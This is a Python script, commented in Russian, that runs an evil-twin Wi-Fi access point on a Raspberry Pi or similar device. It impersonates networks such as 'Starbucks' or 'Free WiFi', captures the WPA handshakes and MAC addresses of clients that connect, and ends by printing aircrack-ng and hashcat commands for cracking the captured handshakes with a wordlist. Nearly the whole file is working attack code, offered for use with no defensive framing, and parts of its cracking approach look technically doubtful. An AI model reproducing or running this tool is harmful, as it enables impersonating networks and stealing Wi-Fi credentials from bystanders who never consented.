#!/usr/bin/env python3
"""
Fake AP с захватом Handshake БЕЗ Monitor Mode
Использует обычный AP mode + tcpdump для захвата EAPOL пакетов
Работает на встроенном WiFi Raspberry Pi!
"""

import os
import sys
import subprocess
import time
import signal
import re
import threading
from datetime import datetime
from pathlib import Path

class APWithCapture:
    def __init__(self, interface, ssid, password="12345678", channel=6):
        self.interface = interface
        self.ssid = ssid
        self.password = password
        self.channel = channel

        # Файлы
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs("captures", exist_ok=True)

        self.hostapd_conf = "/tmp/ap_capture.conf"
        self.capture_file = os.path.join("captures", f"handshake_{ssid}_{timestamp}.pcap")
        self.log_file = os.path.join("captures", f"log_{ssid}_{timestamp}.txt")
        self.clients_file = os.path.join("captures", f"clients_{ssid}_{timestamp}.txt")

        # Процессы
        self.hostapd_process = None
        self.tcpdump_process = None
        self.running = False
        self.handshake_captured = []

    def check_root(self):
        """Проверка прав root"""
        if os.geteuid() != 0:
            print("[!] Требуются права root")
            sys.exit(1)

    def check_dependencies(self):
        """Проверка зависимостей"""
        tools = ['hostapd', 'tcpdump']
        missing = []

        for tool in tools:
            if subprocess.call(['which', tool],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL) != 0:
                missing.append(tool)

        if missing:
            print(f"[!] Отсутствуют: {', '.join(missing)}")
            print("[!] Установите: sudo apt install hostapd tcpdump")
            sys.exit(1)

    def log(self, message, important=False):
        """Логирование"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_msg = f"[{timestamp}] {message}"

        if important:
            print("\n" + "="*70)
            print(log_msg)
            print("="*70 + "\n")
        else:
            print(log_msg)

        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_msg + '\n')

    def prepare_interface(self):
        """Подготовка интерфейса"""
        self.log(f"Подготовка интерфейса {self.interface}")

        # Остановка конфликтующих сервисов
        for service in ['NetworkManager', 'wpa_supplicant']:
            subprocess.run(['systemctl', 'stop', service],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)

        subprocess.run(['killall', 'wpa_supplicant'],
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL)

        # Настройка интерфейса
        subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                      stdout=subprocess.DEVNULL)
        time.sleep(1)

        subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
                      stdout=subprocess.DEVNULL)
        subprocess.run(['ip', 'addr', 'add', '192.168.100.1/24', 'dev', self.interface],
                      stdout=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                      stdout=subprocess.DEVNULL)

        self.log(f"Интерфейс готов: 192.168.100.1")

    def create_hostapd_config(self):
        """Создание конфигурации hostapd"""
        config = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}

# Логирование
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

# WPA2
wpa=2
wpa_passphrase={self.password}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# Доп настройки
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wmm_enabled=1
"""

        with open(self.hostapd_conf, 'w') as f:
            f.write(config)

        self.log(f"Конфигурация создана")

    def start_tcpdump(self):
        """Запуск tcpdump для захвата EAPOL пакетов"""
        self.log(f"Запуск захвата EAPOL пакетов -> {self.capture_file}")

        # Фильтр для EAPOL пакетов (порт 0x888e)
        # и всех пакетов от/к нашему AP
        tcpdump_filter = f"ether proto 0x888e or ether host ff:ff:ff:ff:ff:ff"

        self.tcpdump_process = subprocess.Popen(
            ['tcpdump', '-i', self.interface, '-w', self.capture_file,
             '-U', tcpdump_filter],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        time.sleep(2)

        if self.tcpdump_process.poll() is None:
            self.log("✓ Захват пакетов запущен")
        else:
            self.log("[!] Ошибка запуска tcpdump")

    def parse_hostapd_line(self, line):
        """Парсинг вывода hostapd"""
        line = line.strip()

        # Извлечение MAC адреса
        mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
        mac = mac_match.group(0) if mac_match else "Unknown"

        # Новое подключение
        if 'AP-STA-CONNECTED' in line or 'associated' in line.lower():
            self.log(f"[+] НОВЫЙ КЛИЕНТ: {mac}", important=True)
            self.save_client_info(mac, "Подключен")
            return

        # Аутентификация
        if 'authentication' in line.lower() and mac != "Unknown":
            self.log(f"[*] Аутентификация: {mac}")
            self.save_client_info(mac, "Аутентификация")
            return

        # WPA Handshake - САМОЕ ВАЖНОЕ!
        if 'WPA' in line and ('handshake' in line.lower() or 'EAPOL' in line):
            self.log(f"[***] WPA HANDSHAKE: {mac}", important=True)
            self.save_client_info(mac, "WPA Handshake")

            if mac not in self.handshake_captured:
                self.handshake_captured.append(mac)
                self.check_handshake_in_capture()
            return

        # EAPOL пакеты
        if 'EAPOL' in line:
            self.log(f"[**] EAPOL от: {mac}")
            self.save_client_info(mac, "EAPOL пакет")
            return

        # Отключение
        if 'AP-STA-DISCONNECTED' in line or 'disassociated' in line.lower():
            self.log(f"[-] Отключился: {mac}")
            self.save_client_info(mac, "Отключен")
            return

        # Неудачная попытка
        if 'failed' in line.lower() or 'denied' in line.lower():
            self.log(f"[!] Неудачная попытка: {mac}")
            self.save_client_info(mac, "Неудачная попытка")
            return

    def save_client_info(self, mac, event):
        """Сохранение информации о клиенте"""
        timestamp = datetime.now().isoformat()

        with open(self.clients_file, 'a', encoding='utf-8') as f:
            f.write(f"{timestamp} | {mac} | {event}\n")

    def check_handshake_in_capture(self):
        """Проверка наличия handshake в capture файле"""
        time.sleep(2)  # Даем время tcpdump записать

        # Используем tshark или aircrack-ng для проверки
        try:
            # Попробуем tshark
            result = subprocess.run(
                ['tshark', '-r', self.capture_file, '-Y', 'eapol', '-c', '4'],
                capture_output=True,
                text=True,
                timeout=5
            )

            eapol_count = len(result.stdout.strip().split('\n'))

            if eapol_count >= 4:
                self.log(f"✓✓✓ ПОЛНЫЙ HANDSHAKE ЗАХВАЧЕН! ({eapol_count} EAPOL пакетов)",
                        important=True)
                self.log(f"Файл: {self.capture_file}")
                self.log(f"Для взлома: aircrack-ng {self.capture_file}")
            elif eapol_count > 0:
                self.log(f"Частичный handshake: {eapol_count}/4 EAPOL пакетов")

        except FileNotFoundError:
            # tshark не установлен, используем aircrack-ng
            try:
                result = subprocess.run(
                    ['aircrack-ng', self.capture_file],
                    capture_output=True,
                    text=True,
                    timeout=5
                )

                if 'handshake' in result.stdout.lower():
                    self.log(f"✓✓✓ HANDSHAKE ОБНАРУЖЕН!", important=True)
            except:
                pass

        except:
            pass

    def monitor_hostapd(self):
        """Мониторинг вывода hostapd"""
        try:
            while self.running and self.hostapd_process.poll() is None:
                line = self.hostapd_process.stdout.readline()
                if line:
                    self.parse_hostapd_line(line)
        except:
            pass

    def start_hostapd(self):
        """Запуск hostapd"""
        self.log(f"Запуск точки доступа '{self.ssid}'")

        self.hostapd_process = subprocess.Popen(
            ['hostapd', '-dd', self.hostapd_conf],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )

        time.sleep(3)

        if self.hostapd_process.poll() is None:
            self.log(f"✓ Точка доступа запущена", important=True)
            self.log(f"  SSID: {self.ssid}")
            self.log(f"  Канал: {self.channel}")
            self.log(f"  Пароль: {self.password}")
            self.log(f"  IP: 192.168.100.1")
            self.log(f"\nОжидание подключений...\n")

            self.running = True

            # Запускаем мониторинг в отдельном потоке
            monitor_thread = threading.Thread(target=self.monitor_hostapd)
            monitor_thread.daemon = True
            monitor_thread.start()

            # Главный цикл
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
        else:
            self.log("[!] Ошибка запуска hostapd")

    def cleanup(self):
        """Очистка"""
        self.log("\nОстановка...")
        self.running = False

        # Останавливаем процессы
        for proc in [self.hostapd_process, self.tcpdump_process]:
            if proc:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except:
                    proc.kill()

        # Очистка интерфейса
        subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
                      stdout=subprocess.DEVNULL)

        # Удаление временных файлов
        if os.path.exists(self.hostapd_conf):
            os.remove(self.hostapd_conf)

        self.log("\n" + "="*70)
        self.log(f"ЗАХВАЧЕНО HANDSHAKES: {len(self.handshake_captured)}")
        self.log(f"PCAP файл: {self.capture_file}")
        self.log(f"Лог: {self.log_file}")
        self.log(f"Клиенты: {self.clients_file}")

        if len(self.handshake_captured) > 0:
            self.log("\nДля взлома используйте:")
            self.log(f"  aircrack-ng -w wordlist.txt {self.capture_file}")
            self.log(f"или")
            self.log(f"  hashcat -m 22000 {self.capture_file} wordlist.txt")

        self.log("="*70)

    def run(self):
        """Главный запуск"""
        self.check_root()
        self.check_dependencies()

        # Обработка Ctrl+C
        def signal_handler(sig, frame):
            self.cleanup()
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)

        # Запуск
        self.prepare_interface()
        self.create_hostapd_config()
        self.start_tcpdump()
        self.start_hostapd()

        # Очистка при выходе
        self.cleanup()


def main():
    print("""
╔════════════════════════════════════════════════╗
║   Fake AP + Handshake Capture (NO Monitor!)    ║
║     Работает на ЛЮБОМ WiFi адаптере с AP       ║
║         Включая встроенный WiFi RPi!           ║
╚════════════════════════════════════════════════╝
""")

    if len(sys.argv) < 3:
        print("Использование:")
        print(f"  sudo {sys.argv[0]} <interface> <SSID> [password] [channel]")
        print("\nПримеры:")
        print(f"  sudo {sys.argv[0]} wlan0 'Free WiFi'")
        print(f"  sudo {sys.argv[0]} wlan0 'Starbucks' 'test1234' 6")
        print("\nПреимущества:")
        print("  ✓ НЕ требуется режим монитора")
        print("  ✓ Работает на встроенном WiFi Raspberry Pi")
        print("  ✓ Перехватывает WPA handshake")
        print("  ✓ Сохраняет в .pcap для aircrack-ng/hashcat")
        print("\nТребования:")
        print("  - hostapd")
        print("  - tcpdump")
        print("  - Права root")
        sys.exit(1)

    interface = sys.argv[1]
    ssid = sys.argv[2]
    password = sys.argv[3] if len(sys.argv) > 3 else "12345678"
    channel = int(sys.argv[4]) if len(sys.argv) > 4 else 6

    if len(password) < 8:
        print("[!] Пароль должен быть минимум 8 символов")
        password = "12345678"

    ap = APWithCapture(interface, ssid, password, channel)
    ap.run()


if __name__ == '__main__':
    main()
